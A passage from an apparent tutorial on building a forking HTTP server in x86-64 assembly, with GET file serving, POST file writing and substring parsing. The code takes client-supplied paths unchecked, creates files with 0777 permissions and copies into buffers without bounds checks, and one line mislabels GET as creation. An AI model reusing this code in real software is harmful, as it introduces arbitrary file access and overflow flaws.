<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># get filename
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">filename</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">read_buffer</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">r10</span>            <span style="color:#75715e"># start index
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">call</span> <span style="color:#66d9ef">get_substring</span>
</span></span></code></pre></div><p>Both of these processes used a function called <code>get_substring</code>. This function will take in a string, an output buffer, along with an index, which specifies the starting location in the string for the function, and it will output the ending index. The function will read a substring starting at the specified starting index and ending when it hits a space, then it would write the substring into the specified output buffer and return the end index.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>get_substring:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>substring_loop:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># read each character from buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rsi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">rdx</span>], <span style="color:#ae81ff">32</span>        <span style="color:#75715e"># found a space
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">je</span> <span style="color:#66d9ef">end_get_substring</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># copy current character to request type buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r14b</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rsi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">rdx</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">r15</span>], <span style="color:#66d9ef">r14b</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rdx</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">r15</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">substring_loop</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>end_get_substring:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">r15</span>], <span style="color:#ae81ff">0x00</span>      <span style="color:#75715e"># null terminating character
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rdx</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rdx</span>                      <span style="color:#75715e"># return end index
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">ret</span>
</span></span></code></pre></div><p>Now we need to program a way to know what request type the current request is using. Since our server only handles 2 types of HTTP requests, we can just check the first character and see if it&rsquo;s a &ldquo;G&rdquo; or a &ldquo;P&rdquo; and jump to the section that handles that particular request.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e"># jump to correct request handling section
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15b</span>, [<span style="color:#66d9ef">request_type</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">r15b</span>, <span style="color:#ae81ff">71</span>     <span style="color:#75715e"># &#39;G&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">POST_request</span>
</span></span></code></pre></div><p>Now that we have the filename, which is the requested resource, we can open up the file, read the content, and send the content back to the client.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>GET_request:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># open file to read
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">filename</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">00000000</span> <span style="color:#75715e"># O_RDONLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">2</span>        <span style="color:#75715e"># sys_open
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r10</span>, <span style="color:#66d9ef">rax</span>      <span style="color:#75715e"># opened file fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># read the opened file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r10</span>      <span style="color:#75715e"># get opened file fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">file_content</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">1024</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0</span>        <span style="color:#75715e"># sys_read
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#66d9ef">rax</span>      <span style="color:#75715e"># get number of bytes read
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># close the opened file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r10</span>      <span style="color:#75715e"># get opened file fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">3</span>        <span style="color:#75715e"># sys_close
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># write response message to socket connection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>       <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">response_msg</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">1</span>        <span style="color:#75715e"># sys_write
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># write the read file to socket connection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>       <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">file_content</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">r15</span>      <span style="color:#75715e"># number of bytes in file content
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">1</span>        <span style="color:#75715e"># sys_write
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">serve_stop</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>serve_stop:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># close socket connection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>       <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">3</span>        <span style="color:#75715e"># sys_close
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># exit(0)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">60</span>       <span style="color:#75715e"># sys_exit
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><h2 id="handling-post-requests">Handling POST requests</h2>
<p>The GET request indicates resource creation/update. It will specify an endpoint that it would like to create/update, along with the content that it would like to put into that endpoint, and the server will process that.</p>
<p>A simple POST request will look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>POST /tmp/resource HTTP/1.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>some_random_text
</span></span></code></pre></div><p>The content of the request will be separated by 2 newline characters. So to handle this request, we&rsquo;ll need to first extract the filename, then extract the content that will be written to the file. We can already get the filename from how we handle the GET request, now we need a way to extract the content of the request.</p>
<p>To do that we&rsquo;ll create a function called <code>find_string</code>. This function will take in the buffer to read from, the output buffer to write to, and the delimiter to find. We know that the content of the request will be separated by a double newline, so we can look for that in our request, once we&rsquo;ve found that, we can read the text following that double newline, which will be the content.</p>
<p>We&rsquo;ll define the double newline in the <code>.rodata</code> section. When we call the <code>find_string</code> function, we can pass this double newline in as the 3rd parameter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>double_newline:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.string</span> <span style="color:#e6db74">&#34;\r\n\r\n&#34;</span>
</span></span></code></pre></div><p>Now let&rsquo;s implement the <code>find_string</code> function. We&rsquo;ll basically go through each character of the request, compare the next 4 character with the double newline, and if they&rsquo;re a match, we&rsquo;ll start copying the substring starting at the index immediately after the double newline into the output buffer until we hit a null-terminating character (<code>\0</code>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>find_string:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r15</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r14</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>next_char:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">r15</span>], <span style="color:#ae81ff">0x00</span>               <span style="color:#75715e"># check for null terminator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">je</span> <span style="color:#66d9ef">end_find</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>compare_loop:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># only compare 4 bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">r14</span>, <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">je</span> <span style="color:#66d9ef">found_match</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># compare the next 4 bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">r14</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">r15</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r11b</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rdx</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">r14</span>]               <span style="color:#75715e"># byte from comparison source
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">rax</span>], <span style="color:#66d9ef">r11b</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">no_match</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># byte matches
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">r14</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">compare_loop</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>no_match:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r14</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">r15</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">next_char</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>found_match:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># r15 now has starting position of content string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">r15</span>, <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>copy_content:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># copy bytes to content buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">r15</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#66d9ef">rax</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># end of string
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">rbx</span>], <span style="color:#ae81ff">0x00</span>                <span style="color:#75715e"># null terminator
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">je</span> <span style="color:#66d9ef">end_find</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># copy bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r14b</span>, <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rdi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">rbx</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> <span style="color:#66d9ef">ptr</span> [<span style="color:#66d9ef">rsi</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#66d9ef">rax</span>], <span style="color:#66d9ef">r14b</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rax</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">copy_content</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>end_find:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span>
</span></span></code></pre></div><p>Now we can call this <code>find_string</code> function during our POST request processing to get the content to write to the specified file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>POST_request:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># open file to read
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">filename</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">00000101</span> <span style="color:#75715e"># O_WRONLY | O_CREAT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">0777</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">2</span>        <span style="color:#75715e"># sys_open
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r10</span>, <span style="color:#66d9ef">rax</span>      <span style="color:#75715e"># opened file fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># get request content
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">read_buffer</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">content_buffer</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">double_newline</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">call</span> <span style="color:#66d9ef">find_string</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r11</span>, <span style="color:#66d9ef">rax</span>      <span style="color:#75715e"># get length of content
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># write to file with request content
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r10</span>       <span style="color:#75715e"># get opened file fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">content_buffer</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">r11</span>      <span style="color:#75715e"># number of bytes in content buffer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">1</span>        <span style="color:#75715e"># sys_write
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># close the opened file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r10</span>      <span style="color:#75715e"># get opened file fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">3</span>        <span style="color:#75715e"># sys_close
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># write response message to socket connection
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>       <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">response_msg</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">19</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">1</span>        <span style="color:#75715e"># sys_write
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>serve_stop:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">...</span>
</span></span></code></pre></div><h2 id="processing-multiple-requests">Processing multiple requests</h2>
<p>At this point, we have server that can process both the GET request and the POST request from a connection. However, we can only process 1 connection at a time. What if there&rsquo;s multiple clients who each wants to connect to our server at the same time? We&rsquo;d have to implement multi-processing in order to handle multiple request at once.</p>
<p>In order to implement multi-processing, we&rsquo;ll need to use a syscall called <code>fork</code>. This syscall allows us to duplicate the current process, resulting in 2 of the same process. When <code>fork</code> is called, it creates 2 processes that are the same as each other and it will return a different value depending on the process. It will return the ID of the child process to the original parent process, and it will return 0 to the child process. This fact is really important as it allows us to determine if the current process is a child process or a parent process, which helps us determine which part of the code to execute. Usually the <code>exec</code> syscall is used with <code>fork</code> but for our purposes, which are pretty simple, we don&rsquo;t necessarily need to use <code>exec</code>.</p>

    <img src="/img/asm-webserver/fork-syscall-visual.png"  alt="Socket flow diagram"  class="center"  style="padding: 20px"  />


<p>Another thing about duplicate processes is that they are independent of each other. If we were to say close a file descriptor on the parent process, that file descriptor would still be open on the child process. If the child process want to also close that file descriptor, it would have to do it by itself.</p>
<p>For our web server, the parent process will parent process will be responsible for accepting the socket connection, but not for serving and talking to the accepted connection. The child process will be responsible for serving and talking to the accepted connection, but not for accepting new socket connection.</p>
<p>When the parent process accepts a new connection, it will fork itself to create a child process to handle that connection, then close that accepted connection (since the child process still have access to that accepted connection to talk to), then listen for new connection. If there&rsquo;s another new connection, it does the same thing again, creating another different child process to handle that new connection.</p>
<p>The child process will close the listening socket file descriptor (since it doesn&rsquo;t have to listen for new connections) and process the current accepted connection by communicating through the accepted connection&rsquo;s file descriptor.</p>
<p>To determine whether a process is a child process, we can just compare the <code>fork</code> syscall&rsquo;s return value with 0 and jump to the serve connection section of the code. If it&rsquo;s not 0 then we just close the accepted connection and jump back to listening for a new connection.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>accept_conn:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">57</span>       <span style="color:#75715e"># sys_fork
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># serve the accepted socket connection if is child process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">cmp</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">0</span>        <span style="color:#75715e"># child process always returns 0 on fork call
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">je</span> <span style="color:#66d9ef">serve_conn</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># close the accepted socket connection if is parent process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>       <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">3</span>        <span style="color:#75715e"># sys_close
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">accept_conn</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>serve_conn:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># close the socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r8</span>       <span style="color:#75715e"># get binded socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">3</span>        <span style="color:#75715e"># sys_close
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">...</span>
</span></span></code></pre></div><p>The <code>serve_conn</code> section will contain the GET request processing and the POST request processing code. After the child process is finished with processing the request, it will hit the <code>serve_stop</code> section, which will clean up the process, making sure the file descriptors are closed, and exit the child process as we have no more use for it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>serve_stop:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># close socket connection
